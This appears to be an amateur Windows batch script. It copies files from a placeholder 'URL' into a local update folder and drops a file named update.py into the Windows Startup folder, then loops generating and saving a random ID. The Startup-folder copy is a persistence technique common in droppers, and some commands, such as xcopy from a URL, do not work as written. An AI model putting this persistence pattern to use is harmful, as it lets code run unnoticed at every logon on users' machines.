@echo off

xcopy /e /h URL c:\my\program\update\
copy "URL" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\update.py"


:n1
set /a a=%random%%%(999-1+1)+min
set /a b=%random%%%(999-1+1)+min
set /a c=%random%%%(999-1+1)+min
set /a d=%random%%%(999-1+1)+min
set /a e=%random%%%(999-1+1)+min
set /a f=%random%%%(999-1+1)+min
set /a g=%random%%%(999-1+1)+min
set /a uid=%a%+%b%+%c%+%d%+%e%+%f%+%g%
echo %uid%>c:\my\program\update\uid.txt
cls
echo %uid%
pause
goto n1